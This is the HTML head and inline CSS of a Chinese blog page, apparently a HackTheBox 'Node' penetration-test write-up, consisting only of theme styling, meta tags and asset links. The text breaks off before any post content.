<!DOCTYPE html>
<!-- 
            ◢＼　 ☆　　 ／◣
    　  　∕　　﹨　╰╮∕　　﹨
    　  　▏　　～～′′～～ 　｜
    　　  ﹨／　　　　　　 　＼∕
    　 　 ∕ 　　●　　　 ●　＼
      ＝＝　○　∴·╰╯　∴　○　＝＝
    　    ╭──╮　　　　　╭──╮
  ╔═ ∪∪∪═Mashiro&Hitomi═∪∪∪═╗
--><html lang="zh-CN">

<head>
	<meta name="theme-color">
	<meta charset="UTF-8">
	<!--<meta name="viewport" content="width=device-width, initial-scale=1">-->
	<meta name="referrer" content="no-referrer">
	<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <link rel="stylesheet" href="https://s.nmxc.ltd/sakurairo_vision/@2.6/fontawesome/css/all.min.css" type="text/css" media="all">
		<link rel="shortcut icon" href="https://s.nmxc.ltd/sakurairo_vision/@2.6/basic/favicon.ico">
	<meta http-equiv="x-dns-prefetch-control" content="on">
		<title>HTB靶机 Node 渗透测试记录 &#8211; 御坂19008号の渗透小屋</title>
<meta name="robots" content="max-image-preview:large">
<link rel="dns-prefetch" href="//s.nmxc.ltd">
<link rel="dns-prefetch" href="//cdnjs.cloudflare.com">
<link rel="stylesheet" id="wp-block-library-css" href="https://misaka19008.github.io/wp-includes/css/dist/block-library/style.min.css?ver=6.5.5" type="text/css" media="all">
<style id="classic-theme-styles-inline-css" type="text/css">/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}</style>
<style id="global-styles-inline-css" type="text/css">body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}body .is-layout-grid{display: grid;}body .is-layout-grid > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}</style>
<style id="md-style-inline-css" type="text/css">.katex-container { margin: 25px !important; text-align: center; } .katex-container.katex-inline { display: inline-block !important; background: none !important; margin: 0 !important; padding: 0 !important; } pre .katex-container { font-size: 1.4em !important; } .katex-inline { background: none !important; margin: 0 3px; } .copy-button { cursor: pointer; border: 0; font-size: 12px; text-transform: uppercase; font-weight: 500; padding: 3px 6px 3px 6px; background-color: rgba(255, 255, 255, 0.6); position: absolute; overflow: hidden; top: 5px; right: 5px; border-radius: 3px; } .copy-button:before { content: ""; display: inline-block; width: 16px; height: 16px; margin-right: 3px; background-size: contain; background-image: url("data:image/svg+xml,%3Csvg version=\'1.1\' xmlns=\'http://www.w3.org/2000/svg\' xmlns:xlink=\'http://www.w3.org/1999/xlink\' x=\'0px\' y=\'0px\' width=\'16px\' height=\'16px\' viewBox=\'888 888 16 16\' enable-background=\'new 888 888 16 16\' xml:space=\'preserve\'%3E %3Cpath fill=\'%23333333\' d=\'M903.143,891.429c0.238,0,0.44,0.083,0.607,0.25c0.167,0.167,0.25,0.369,0.25,0.607v10.857 c0,0.238-0.083,0.44-0.25,0.607s-0.369,0.25-0.607,0.25h-8.571c-0.238,0-0.44-0.083-0.607-0.25s-0.25-0.369-0.25-0.607v-2.571 h-4.857c-0.238,0-0.44-0.083-0.607-0.25s-0.25-0.369-0.25-0.607v-6c0-0.238,0.06-0.5,0.179-0.786s0.262-0.512,0.428-0.679 l3.643-3.643c0.167-0.167,0.393-0.309,0.679-0.428s0.547-0.179,0.786-0.179h3.714c0.238,0,0.44,0.083,0.607,0.25 c0.166,0.167,0.25,0.369,0.25,0.607v2.929c0.404-0.238,0.785-0.357,1.143-0.357H903.143z M898.286,893.331l-2.67,2.669h2.67V893.331 z M892.571,889.902l-2.669,2.669h2.669V889.902z M894.321,895.679l2.821-2.822v-3.714h-3.428v3.714c0,0.238-0.083,0.441-0.25,0.607 s-0.369,0.25-0.607,0.25h-3.714v5.714h4.571v-2.286c0-0.238,0.06-0.5,0.179-0.786C894.012,896.071,894.155,895.845,894.321,895.679z M902.857,902.857v-10.286h-3.429v3.714c0,0.238-0.083,0.441-0.25,0.607c-0.167,0.167-0.369,0.25-0.607,0.25h-3.714v5.715H902.857z\' /%3E %3C/svg%3E"); background-repeat: no-repeat; position: relative; top: 3px; } pre { position: relative; } pre:hover .copy-button { background-color: rgba(255, 255, 255, 0.9); } .md-widget-toc { padding: 15px; } .md-widget-toc a { color: #333333; } .post-toc-header { font-weight: 600; margin-bottom: 10px; } .md-post-toc { font-size: 0.9em; } .post h2 { overflow: hidden; } .post-toc-block { margin: 0 10px 20px 10px; overflow: hidden; } .post-toc-block.with-border { border: 1px #dddddd solid; padding: 10px; } .post-toc-block.float-right { max-width: 320px; float: right; } .post-toc-block.float-left { max-width: 320px; float: left; } .md-widget-toc ul, .md-widget-toc ol, .md-post-toc ul, .md-post-toc ol { padding-left: 15px; margin: 0; } .md-widget-toc ul ul, .md-widget-toc ul ol, .md-widget-toc ol ul, .md-widget-toc ol ol, .md-post-toc ul ul, .md-post-toc ul ol, .md-post-toc ol ul, .md-post-toc ol ol { padding-left: 2em; } .md-widget-toc ul ol, .md-post-toc ul ol { list-style-type: lower-roman; } .md-widget-toc ul ul ol, .md-widget-toc ul ol ol, .md-post-toc ul ul ol, .md-post-toc ul ol ol { list-style-type: lower-alpha; } .md-widget-toc ol ul, .md-widget-toc ol ol, .md-post-toc ol ul, .md-post-toc ol ol { padding-left: 2em; } .md-widget-toc ol ol, .md-post-toc ol ol { list-style-type: lower-roman; } .md-widget-toc ol ul ol, .md-widget-toc ol ol ol, .md-post-toc ol ul ol, .md-post-toc ol ol ol { list-style-type: lower-alpha; } .post pre code script, .language-mathjax ~ .copy-button { display: none !important; }</style>
<link rel="stylesheet" id="saukra-css-css" href="https://misaka19008.github.io/wp-content/themes/Sakurairo-main/style.css?ver=2.6.3.1" type="text/css" media="all">
<link rel="stylesheet" id="entry-content-css" href="https://misaka19008.github.io/wp-content/themes/Sakurairo-main/css/theme/sakura.css?ver=2.6.3.1" type="text/css" media="all">
<link rel="stylesheet" id="highlight-css-0-css" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/styles/atelier-cave-dark.min.css?ver=9.15.10" type="text/css" media="all">
<link rel="stylesheet" id="emojify-css" href="https://cdnjs.cloudflare.com/ajax/libs/emojify.js/1.1.0/css/basic/emojify.min.css?ver=1.1.0" type="text/css" media="all">
<script type="text/javascript" src="https://misaka19008.github.io/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://misaka19008.github.io/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script type="text/javascript" src="https://misaka19008.github.io/wp-content/plugins/wp-githuber-md/assets/js/jquery.toc.min.js?ver=1.0.1" id="githuber-toc-js"></script>
<link rel="https://api.w.org/" href="https://misaka19008.github.io/wp-json/">
<link rel="alternate" type="application/json" href="https://misaka19008.github.io/wp-json/wp/v2/posts/45">
<link rel="canonical" href="https://misaka19008.github.io/2024/07/08/htb%e9%9d%b6%e6%9c%ba-node-%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95%e8%ae%b0%e5%bd%95/">
<link rel="shortlink" href="https://misaka19008.github.io/?p=45">
<link rel="alternate" type="application/json+oembed" href="https://misaka19008.github.io/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fhttps%3A%2F%2Fmisaka19008.github.io%2F2024%2F07%2F08%2Fhtb%25e9%259d%25b6%25e6%259c%25ba-node-%25e6%25b8%2597%25e9%2580%258f%25e6%25b5%258b%25e8%25af%2595%25e8%25ae%25b0%25e5%25bd%2595%2F">
<link rel="alternate" type="text/xml+oembed" href="https://misaka19008.github.io/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fhttps%3A%2F%2Fmisaka19008.github.io%2F2024%2F07%2F08%2Fhtb%25e9%259d%25b6%25e6%259c%25ba-node-%25e6%25b8%2597%25e9%2580%258f%25e6%25b5%258b%25e8%25af%2595%25e8%25ae%25b0%25e5%25bd%2595%2F#038;format=xml">
<style>.site-top .lower nav {display: block !important;}
:root{
    --theme-skin: #505050;
    --theme-skin-matching:#F9D938;
    --infor_bar_bgcolor:rgba(255,255,255,0.6);
    --style_menu_selection_radius:10px;
    --post_list_matching_color:#FCCD00;
    --load_nextpage_svg:url("https://s.nmxc.ltd/sakurairo_vision/@2.6/load_svg/ball.svg");
    --style_menu_radius:10px;
    --post-list-thumb: #e8e8e8;
    --friend-link-shadow: #e8e8e8;
    --friend-link-title: #ac354b;
    --comment_area_matching: #6667ab;
    --comment_area_shadow: #e8e8e8;
    --shuoshuo_background_color1:rgba(255,224,102,0.2);
    --shuoshuo_background_color2:rgba(255,204,0,0.2);
    --inline_code_background_color:#F2F1F1;
        --theme-skin-dark:  #FCCD00;
    --global-font-weight:300;
    --theme-dm-background_transparency:0.8;
    --exhibition_area_matching_color:#a0daa9;
    --inline_code_background_color_in_dark_mode:#505050;
}
.the-feature.from_left_and_right .info,.the-feature.from_left_and_right .info h3{background: rgba(255,255,255,0.4) ;}

/*白猫样式Logo*/


/*非全局色彩管理*/
.post-date {
    background-color: #FCCD0026;
}

.center-text{
color: #FFF ;
font-size: 80px;
}
.Ubuntu-font,.center-text{
font-family:  ;
}

.notice i ,
.notice {
    color: #999;
}

.notice {
    border: 1px solid #E6E6E6;
}

.entry-content th {
    background-color: #505050}


#centerbg{}

/*预加载部分*/

#preload {
    position: fixed;
    width: 100%;
    height: 100%;
    top: 0;
    left: 0;
    background: #ffffff;
    z-index: 99999;
}

#preload li.active {
    position: absolute;
    top: 49%;
    left: 49%;
    list-style: none;
}

html {
    overflow-y: hidden;
}

#preloader_3 {
    position:relative;
}
#preloader_3:before {
    background:#FCCD00;
    -webkit-animation: preloader_3_before 1.5s infinite ease-in-out;
    -moz-animation: preloader_3_before 1.5s infinite ease-in-out;
    -ms-animation: preloader_3_before 1.5s infinite ease-in-out;
    animation: preloader_3_before 1.5s infinite ease-in-out;
}
#preloader_3:after {
    background:#ffea99;
    left:22px;
    -webkit-animation: preloader_3_after 1.5s infinite ease-in-out;
    -moz-animation: preloader_3_after 1.5s infinite ease-in-out;
    -ms-animation: preloader_3_after 1.5s infinite ease-in-out;
    animation: preloader_3_after 1.5s infinite ease-in-out;
}
#preloader_3:before,#preloader_3:after {
    width:20px;
    height:20px;
    border-radius:20px;
    background:#ffea99;
    position:absolute;
    content:'';
}
@-webkit-keyframes preloader_3_before {
    0% {
        -webkit-transform: translateX(0px) rotate(0deg)
    }
    50% {
        -webkit-transform: translateX(50px) scale(1.2) rotate(260deg);
        background:#ffea99;
        border-radius:0px;
    }
    100% {
        -webkit-transform: translateX(0px) rotate(0deg)
    }
}
@-webkit-keyframes preloader_3_after {
    0% {
        -webkit-transform: translateX(0px)
    }
    50% {
        -webkit-transform: translateX(-50px) scale(1.2) rotate(-260deg);
        background:#FCCD00;
        border-radius:0px;
    }
    100% {
        -webkit-transform: translateX(0px)
    }
}
@-moz-keyframes preloader_3_before {
    0% {
        -moz-transform: translateX(0px) rotate(0deg)
    }
    50% {
        -moz-transform: translateX(50px) scale(1.2) rotate(260deg);
        background:#ffea99;
        border-radius:0px;
    }
    100% {
        -moz-transform: translateX(0px) rotate(0deg)
    }
}
@-moz-keyframes preloader_3_after {
    0% {
        -moz-transform: translateX(0px)
    }
    50% {
        -moz-transform: translateX(-50px) scale(1.2) rotate(-260deg);
        background:#FCCD00;
        border-radius:0px;
    }
    100% {
        -moz-transform: translateX(0px)
    }
}
@-ms-keyframes preloader_3_before {
    0% {
        -ms-transform: translateX(0px) rotate(0deg)
    }
    50% {
        -ms-transform: translateX(50px) scale(1.2) rotate(260deg);
        background:#ffea99;
        border-radius:0px;
    }
    100% {
        -ms-transform: translateX(0px) rotate(0deg)
    }
}
@-ms-keyframes preloader_3_after {
    0% {
        -ms-transform: translateX(0px)
    }
    50% {
        -ms-transform: translateX(-50px) scale(1.2) rotate(-260deg);
        background:#FCCD00;
        border-radius:0px;
    }
    100% {
        -ms-transform: translateX(0px)
    }
}
@keyframes preloader_3_before {
    0% {
        transform: translateX(0px) rotate(0deg)
    }
    50% {
        transform: translateX(50px) scale(1.2) rotate(260deg);
        background:#ffea99;
        border-radius:0px;
    }
    100% {
        transform: translateX(0px) rotate(0deg)
    }
}
@keyframes preloader_3_after {
    0% {
        transform: translateX(0px)
    }
    50% {
        transform: translateX(-50px) scale(1.2) rotate(-260deg);
        background:#FCCD00;
        border-radius:0px;
    }
    100% {
        transform: translateX(0px)
    }
}

/*深色模式*/
/*可变项目*/

/*深色模式控件透明度*/
body.dark .header-info,
body.dark .header-shuo,
body.dark .top-social img
{color:#fff;background:rgba(51,51,51,0.8);}

body.dark .the-feature.from_left_and_right .info
{background-color: rgba(51,51,51,0.8);}

body.dark .yya,
body.dark input[type=submit] 
{background-color:rgba(38,38,38,0.8) !important;}

/*深色模式自定义颜色*/
body.dark .headertop-down svg path 
{fill: rgba(51,51,51,0.8) !important;transition: all 0.8s ease !important;}

/*深色模式图像亮度*/
body.dark img,
body.dark .highlight-wrap,
body.dark iframe,
body.dark .entry-content .aplayer,
body.dark .post-thumb video
{filter:brightness(0.8);}
@media (max-width: 1200px){
body.dark .site-top .lower nav.navbar ul 
{background: rgba(255,255,255,0);}
}

/*字体*/


.serif{
font-family: !important ;
font-size: 15px;
}

body{
font-family: !important;
font-size: 15px;
}

.site-top ul li a,.header-user-name,.header-user-menu a {
font-family:Noto Serif SC !important;
}


.site-title a{
font-family: 'Noto Serif SC';
}


.site-info,.site-info a{
font-family:Noto Serif SC !important;
}

.skin-menu p{
font-family:Noto Serif SC !important;
}

h1.main-title,h1.fes-title{
font-family:Noto Serif SC;
}

.header-info p, .header-shuo p{
font-family:Noto Serif SC !important;
font-size: 16px;
}

.cbp_tmtimeline > li .cbp_tmlabel {
font-family:Noto Serif SC !important;
}

.post-list-thumb .post-title h3{
font-size: 18px !important;
}

.post-meta, .post-meta a{
font-size: 12px !important;
}

.pattern-center h1.cat-title,
.pattern-center h1.entry-title {
font-size: 40px ;
}
.pattern-center-sakura h1.cat-title,
.pattern-center-sakura h1.entry-title {
font-size: 40px !important;
}

.single-center .single-header h1.entry-title {
font-size: 32px ;
}

/*鼠标*/
body{
cursor: url(https://s.nmxc.ltd/sakurairo_vision/@2.6/cursor/normal.cur), auto;
}

.headertop-down,
#waifu #live2d,
.aplayer svg,
.aplayer.aplayer-narrow .aplayer-body,
.aplayer.aplayer-narrow .aplayer-pic,
#emotion-toggle,
.emoji-item,
.emotion-box,
.emotion-item,
.on-hover,
.tieba-container span,
#moblieGoTop,
#changskin{
cursor: url(https://s.nmxc.ltd/sakurairo_vision/@2.6/cursor/No_Disponible.cur), auto;
}

a,
.ins-section .ins-section-header,
.font-family-controls button,
.menu-list li,.ins-section .ins-search-item,
.ins-section .ins-search-item .ins-search-preview{
cursor: url(https://s.nmxc.ltd/sakurairo_vision/@2.6/cursor/ayuda.cur), auto;
}

p,
.highlight-wrap code,
.highlight-wrap,
.hljs-ln-code .hljs-ln-line{
cursor: url(https://s.nmxc.ltd/sakurairo_vision/@2.6/cursor/texto.cur), auto;
}

a:active{
cursor: url(https://s.nmxc.ltd/sakurairo_vision/@2.6/cursor/work.cur), alias;
}

/*背景类*/
.comment-respond textarea {
background-image: url(); 
}

.search-form.is-visible{
background-image: url(https://s.nmxc.ltd/sakurairo_vision/@2.6/basic/iloli.gif);
}

.site-footer {
background-color: rgba(255, 255, 255,0.65);
}

.wrapper {
background-color: rgba(255, 255, 255,0.65);
}

/*首页圆角设置*/
.header-info,.header-shuo{
border-radius: 15px;
grid-row: 1;
grid-column: 1;
}


.focusinfo img{
border-radius: 15px;
}

.focusinfo .header-tou img{
border-radius: 100px;
}

/*标题横线动画*/

/*标题动画*/
.entry-title,.single-center .entry-census a,.entry-census,.post-list p,.p-time,.feature{
	-moz-animation: fadeInDown 2s;
    -webkit-animation:fadeInDown 2s;
	animation: fadeInDown 2s;
}
@-moz-keyframes fadeInUp {
	0% {
		-moz-transform: translateY(200%);
		transform: translateY(200%);
		opacity: 0
	}
 
	50% {
		-moz-transform: translateY(200%);
		transform: translateY(200%);
		opacity: 0
	}
 
	100% {
		-moz-transform: translateY(0%);
		transform: translateY(0%);
		opacity: 1
	}
}
 
@-webkit-keyframes fadeInUp {
	0% {
		-webkit-transform: translateY(200%);
		transform: translateY(200%);
		opacity: 0
	}
 
	50% {
		-webkit-transform: translateY(200%);
		transform: translateY(200%);
		opacity: 0
	}
 
	100% {
		-webkit-transform: translateY(0%);
		transform: translateY(0%);
		opacity: 1
	}
}
 
@keyframes fadeInUp {
	0% {
		-moz-transform: translateY(200%);
		-ms-transform: translateY(200%);
		-webkit-transform: translateY(200%);
		transform: translateY(200%);
		opacity: 0
	}
 
	50% {
		-moz-transform: translateY(200%);
		-ms-transform: translateY(200%);
		-webkit-transform: translateY(200%);
		transform: translateY(200%);
		opacity: 0
	}
 
	100% {
		-moz-transform: translateY(0%);
		-ms-transform: translateY(0%);
		-webkit-transform: translateY(0%);
		transform: translateY(0%);
		opacity: 1
	}
}

/*首页封面动画*/
h1.main-title, h1.fes-title,.the-feature.from_left_and_right .info,
.header-info p,.header-info,.header-shuo,.header-shuo p,
.focusinfo .header-tou img,.top-social img,.center-text{
	-moz-animation: fadeInDown  2s;
    -webkit-animation:fadeInDown  2s;
	animation: fadeInDown  2s;
}
@-moz-keyframes fadeInDown {
	0% {
		-moz-transform: translateY(-100%);
		transform: translateY(-100%);
		opacity: 0
	}
 
	50% {
		-moz-transform: translateY(-100%);
		transform: translateY(-100%);
		opacity: 0
	}
 
	100% {
		-moz-transform: translateY(0%);
		transform: translateY(0%);
		opacity: 1
	}
}
 
@-webkit-keyframes fadeInDown {
	0% {
		-webkit-transform: translateY(-100%);
		transform: translateY(-100%);
		opacity: 0
	}
 
	50% {
		-webkit-transform: translateY(-100%);
		transform: translateY(-100%);
		opacity: 0
	}
 
	100% {
		-webkit-transform: translateY(0%);
		transform: translateY(0%);
		opacity: 1
	}
}
 
@keyframes fadeInDown {
	0% {
		-moz-transform: translateY(-100%);
		-ms-transform: translateY(-100%);
		-webkit-transform: translateY(-100%);
		transform: translateY(-100%);
		opacity: 0
	}
 
	50% {
		-moz-transform: translateY(-100%);
		-ms-transform: translateY(-100%);
		-webkit-transform: translateY(-100%);
		transform: translateY(-100%);
		opacity: 0
	}
 
	100% {
		-moz-transform: translateY(0%);
		-ms-transform: translateY(0%);
		-webkit-transform: translateY(0%);
		transform: translateY(0%);
		opacity: 1
	}
}

/*导航菜单动画*/
.site-top ul {
	-moz-animation: fadeInLeft  2s;
    -webkit-animation:fadeInLeft  2s;
	animation: fadeInLeft  2s;
    max-width: 76vw;
}
@-moz-keyframes fadeInLeft {
	0% {
		-moz-transform: translateX(100%);
		transform: translateX(100%);
		opacity: 0
	}
 
	50% {
		-moz-transform: translateX(100%);
		transform: translateX(100%);
		opacity: 0
	}
 
	100% {
		-moz-transform: translateX(0%);
		transform: translateX(0%);
		opacity: 1
	}
}
 
@-webkit-keyframes fadeInLeft {
	0% {
		-webkit-transform: translateX(100%);
		transform: translateX(100%);
		opacity: 0
	}
 
	50% {
		-webkit-transform: translateX(100%);
		transform: translateX(100%);
		opacity: 0
	}
 
	100% {
		-webkit-transform: translateX(0%);
		transform: translateX(0%);
		opacity: 1
	}
}
 
@keyframes fadeInLeft {
	0% {
		-moz-transform: translateX(100%);
		-ms-transform: translateX(100%);
		-webkit-transform: translateX(100%);
		transform: translateX(100%);
		opacity: 0
	}
 
	50% {
		-moz-transform: translateX(100%);
		-ms-transform: translateX(100%);
		-webkit-transform: translateX(100%);
		transform: translateX(100%);
		opacity: 0
	}
 
	100% {
		-moz-transform: translateX(0%);
		-ms-transform: translateX(0%);
		-webkit-transform: translateX(0%);
		transform: translateX(0%);
		opacity: 1
	}
}

/*其他*/

.headertop{
    border-radius: 0 0 15px 15px;
}









@media (max-width: 860px) {
.headertop-down {
        display: none
    }
}

.ai-excerpt,
.ai-excerpt-tip {
    display: none;
}




.post-list-thumb:nth-child(2n) .post-content-wrap {
    float: left;
    padding-left: 30px;
    padding-right: 0;
    text-align: right;
    margin: 20px 10px 10px 0
}
.post-list-thumb:nth-child(2n) .post-thumb {
    float: left
}

.post-list-thumb:nth-child(2n) .post-thumb a {
    border-radius: 10px 0 0 10px
}

.pattern-center::after {
    display:none;
}
.pattern-center-blank {
    display:none;
}

.yya {
    position: fixed;
    -webkit-transition: all 1s ease !important;
    transition: all 1s ease !important;
    border-radius: 15px !important;
}
.site-title img {
    margin-left: 10px;
}
.site-header {
    border-radius: 15px !important;
}
.header-user-menu {
    border-radius: 15px !important;
}
.lower li ul {
    border-radius: 15px !important;
}
@media (max-width:860px) {
.openNav .icon {
        left: 5vw;
    }
.site-header {
    width: 100%;
    height: 60px;
    top: 0;
    left: 0;
    background: 0 0;
    position: fixed;
    border-radius: 0 !important;
}
.yya {
    border-radius: 0 !important;
}
}



.cbp_tmtimeline > li:nth-child(odd) .cbp_tmlabel:after {
    display: none;
}
.cbp_tmtimeline > li .cbp_tmlabel:after {
    display: none;
}

.the-feature.from_left_and_right {
    position: relative;
    border-radius: 15px;
    height: 160px;
    width: 258px;
    margin: 6px 6px 0 6px;
}

.the-feature img {
    height: 160px;
    width: 258px;
}



.notice {
    background-image:url(https://s.nmxc.ltd/sakurairo_vision/@2.6/series/announcement_bg.webp);
